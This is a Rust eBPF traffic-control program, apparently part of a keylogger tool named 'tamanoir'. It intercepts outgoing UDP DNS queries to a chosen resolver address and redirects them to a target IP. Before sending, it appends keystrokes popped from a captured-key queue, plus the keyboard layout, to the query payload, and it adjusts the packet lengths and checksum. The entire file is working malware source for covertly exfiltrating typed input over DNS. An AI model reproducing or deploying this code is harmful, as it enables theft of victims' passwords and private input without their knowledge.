use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::TC_ACT_PIPE,
    macros::{classifier, map},
    maps::PerCpuArray,
    programs::TcContext,
};
use aya_log_ebpf::{debug, error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    inject_keys, load_bytes, store_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len,
    UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN, DNS_QUERY_OFFSET, HIJACK_IP,
    KEYBOARD_LAYOUT, KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
};

pub struct Buf {
    pub buf: [u8; DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN],
}

#[map]
pub static DNS_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);

#[classifier]
pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
    match tc_process_egress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
    let mut res = [0u8; KEYS_PAYLOAD_LEN];
    res[0] = unsafe { core::ptr::read_volatile(&KEYBOARD_LAYOUT) };
    for item in res.iter_mut().take(KEYS_PAYLOAD_LEN).skip(1) {
        *item = DATA.pop().unwrap_or_default();
    }
    res
}

fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0)?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == hijack_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");

                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET)?;
                debug!(
                    ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(u32::from_be(header.src_addr)),
                    u16::from_be(udp_hdr.source),
                    Ipv4Addr::from_bits(u32::from_be(header.dst_addr)),
                    u16::from_be(udp_hdr.dest),
                );
                let dns_payload_len = (ctx.len() as usize)
                    .checked_sub(DNS_QUERY_OFFSET)
                    .ok_or(-1)?;

                if dns_payload_len < DNS_PAYLOAD_MAX_LEN {
                    let keys = read_keys();
                    debug!(ctx, "Fetch keys from the queue");

                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(-1)?;
                        &mut (*ptr).buf
                    };
                    load_bytes(ctx, DNS_QUERY_OFFSET, buf)?;

                    update_addr(ctx, &addr, &target_ip.to_be(), UpdateType::Dst)?;
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                    )?;

                    //make room
                    debug!(ctx, "adjust room");
                    ctx.skb
                        .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
                        .inspect_err(|_| {
                            error!(ctx, "error adjusting room");
                        })?;

                    // move udp header
                    let udp_hdr_bytes = ctx.load::<[u8; 8]>(UDP_OFFSET + KEYS_PAYLOAD_LEN)?;
                    store_bytes(ctx, UDP_OFFSET, &udp_hdr_bytes, 0)?;

                    update_udp_hdr_len(
                        ctx,
                        &(u16::from_be(udp_hdr.len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                    )?;

                    //move dns payload
                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr(0).ok_or(-1)?;
                        &(*ptr).buf
                    };
                    debug!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
                    store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0)?;
                    inject_keys(ctx, DNS_QUERY_OFFSET + dns_payload_len, keys)?;

                    //set current csum to 0
                    ctx.store(crate::common::UDP_CSUM_OFFSET, &0u16, 2)
                        .map_err(|_| {
                            error!(ctx, "error zeroing L4 csum");
                            -1
                        })?;

                    info!(
                        ctx,
                        " {}:{} -> {}:{}",
                        Ipv4Addr::from_bits(u32::from_be(
                            (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).src_addr,
                        )),
                        u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
                        Ipv4Addr::from_bits(u32::from_be(
                            (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr
                        )),
                        u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                    );
                };
            }
        };
    }

    Ok(TC_ACT_PIPE)
}
